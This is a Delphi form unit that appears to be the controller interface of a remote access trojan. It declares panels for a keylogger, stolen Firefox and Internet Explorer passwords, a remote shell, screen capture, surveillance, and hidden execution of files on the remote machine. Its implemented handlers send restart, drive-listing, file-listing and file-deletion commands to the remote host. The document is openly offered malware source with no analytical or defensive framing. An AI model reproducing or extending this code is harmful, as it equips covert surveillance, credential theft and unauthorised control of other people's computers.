unit untfrmManage;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, ExtCtrls, untFunc, Menus;

type
  TfrmManage = class(TForm)
    cmbManage: TComboBox;
    GroupBox1: TGroupBox;
    lvSystemInformation: TListView;
    GroupBox2: TGroupBox;
    lvServerSettings: TListView;
    GBManagers: TGroupBox;
    PCManagers: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    TabSheet7: TTabSheet;
    GBTools: TGroupBox;
    PCTools: TPageControl;
    TabSheet8: TTabSheet;
    TabSheet9: TTabSheet;
    GBSurveillance: TGroupBox;
    PCSurveillance: TPageControl;
    TabSheet10: TTabSheet;
    TabSheet11: TTabSheet;
    TabSheet12: TTabSheet;
    GBAdministration: TGroupBox;
    GroupBox3: TGroupBox;
    txtID: TEdit;
    cmdEditID: TButton;
    cmdUpdate: TButton;
    cmdRestart: TButton;
    cmdUninstall: TButton;
    txtCurrentFolder: TEdit;
    tvRegistry: TTreeView;
    lvRegistry: TListView;
    lvProcesses: TListView;
    lvServices: TListView;
    ListView2: TListView;
    lvWindows: TListView;
    tvDevices: TTreeView;
    memKeylogger: TMemo;
    Image1: TImage;
    Label1: TLabel;
    lstInterval: TListBox;
    cmdStartCapture: TButton;
    cmdSingleCapture: TButton;
    tvPasswords: TTreeView;
    lvFirefoxPasswords: TListView;
    lvInternetExplorerPasswords: TListView;
    lvOtherPasswords: TListView;
    lvActivePorts: TListView;
    memRemoteShell: TMemo;
    cmdListDrives: TButton;
    cmdGoBack: TButton;
    mnutvFolders: TPopupMenu;
    mnutvFoldersRefresh: TMenuItem;
    mnulvFiles: TPopupMenu;
    mnulvFilesUpload: TMenuItem;
    mnulvFilesDownload: TMenuItem;
    N1: TMenuItem;
    mnulvFilesDelete: TMenuItem;
    mnulvFilesExecute: TMenuItem;
    mnuExecuteHidden: TMenuItem;
    mnuExecuteVisible: TMenuItem;
    Panel1: TPanel;
    tvFolders: TTreeView;
    lvFiles: TListView;
    Splitter1: TSplitter;
    procedure cmbManageChange(Sender: TObject);
    procedure cmdRestartClick(Sender: TObject);
    procedure cmdListDrivesClick(Sender: TObject);
    procedure tvFoldersDblClick(Sender: TObject);
    procedure cmdGoBackClick(Sender: TObject);
    procedure txtCurrentFolderChange(Sender: TObject);
    procedure mnutvFoldersRefreshClick(Sender: TObject);
    procedure mnulvFilesDeleteClick(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmManage: TfrmManage;
  iSelectedFolder: Integer;

implementation

{$R *.dfm}

procedure TfrmManage.cmbManageChange(Sender: TObject);
begin
  If cmbManage.Text = 'Administration' Then
  Begin
    GBAdministration.BringToFront;
  End;

  If cmbManage.Text = 'Managers' Then
  Begin
    GBManagers.BringToFront;
  End;

  If cmbManage.Text = 'Surveillance' Then
  Begin
    GBSurveillance.BringToFront;
  End;

  If cmbManage.Text = 'Tools' Then
  Begin
    GBTools.BringToFront;
  End;
end;

procedure TfrmManage.cmdRestartClick(Sender: TObject);
begin
  SendDataManage('Restart');
end;

procedure TfrmManage.cmdListDrivesClick(Sender: TObject);
begin
  SendDataManage('ListDrives');
end;

procedure TfrmManage.tvFoldersDblClick(Sender: TObject);
begin
  If tvFolders.Items.Count <> 0 Then
  Begin
    iSelectedFolder := tvFolders.Selected.Index;
    SendDataManage('ListFiles|' + tvFolders.Selected.Text);
  End;

  txtCurrentFolder.Text := tvFolders.Selected.Text;
end;

procedure TfrmManage.cmdGoBackClick(Sender: TObject);
var
  sTemp: TStringList;
  sData: String;
  i: Integer;
begin
  sTemp := Explode('\', txtCurrentFolder.Text);

  For i := 0 To sTemp.Count - 2 Do
  Begin
    sData := sData + sTemp[i] + '\'
  End;

  SendDataManage('ListFiles|' + sData);
  txtCurrentFolder.Text := sData;
end;

procedure TfrmManage.txtCurrentFolderChange(Sender: TObject);
begin
  If Length(txtCurrentFolder.Text) < 4 Then
  Begin
    cmdGoBack.Enabled := False;
  End Else Begin
    cmdGoBack.Enabled := True;
  End;
end;

procedure TfrmManage.mnutvFoldersRefreshClick(Sender: TObject);
begin
  If Length(txtCurrentFolder.Text) <= 4 Then Exit;
  SendDataManage('ListFiles|' + txtCurrentFolder.Text);
end;

procedure TfrmManage.mnulvFilesDeleteClick(Sender: TObject);
begin
  If lvFiles.Selected.Selected = True Then
  Begin
    SendDataManage('DeleteFile|' + lvFiles.Selected.Caption);
    SendDataManage('ListFiles|' + txtCurrentFolder.Text);
  End;
end;

end.
